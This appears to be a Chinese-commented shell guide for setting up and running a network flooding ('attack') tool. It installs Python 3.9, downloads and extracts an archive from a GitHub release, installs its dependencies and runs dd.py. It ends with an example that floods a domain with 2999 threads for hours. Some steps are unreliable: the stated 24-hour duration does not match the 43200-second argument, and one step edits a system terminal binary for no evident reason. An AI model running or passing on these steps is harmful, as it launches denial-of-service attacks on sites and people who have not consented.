# 刷新软件包索引
sudo apt update
sudo apt install software-properties-common
sudo add-apt-repository ppa:deadsnakes/ppa

# 按下 Enter 以继续
sudo apt install python3.9

# 添加使用 python3.9 为 python3 默认选项
sudo update-alternatives --install /usr/bin/python3 python3 /usr/bin/python3.9 3

# 确认版本
python3 --version

# 呈现版本
Python 3.9.+

# 切换活动的 Python 版本
sudo update-alternatives --config python3

# 更新终端脚本
sudo nano /usr/bin/gnome-terminal


# 添加apt-get模块
sudo apt-get install python3-apt --reinstall


# 载入本脚本
wget -c https://github.com/xhjvpn/dd/releases/download/dd/dd.tar.gz -O - | tar -xz

# 打开路径
cd dd

# 备用
pip install --upgrade pip

# 添加apt-get模块
apt install python3-pip


# 安装依赖
pip3 install -r requirements.txt

# 安装pip+pip3
python3 d1.py

# 运行攻击
python3 dd.py

# 快捷循环攻击举例
# screen后台运行 python3依赖 dd.py脚本 域名\线程\运行24小时后停止

screen python3 dd.py https:99999999999.com 2999 43200

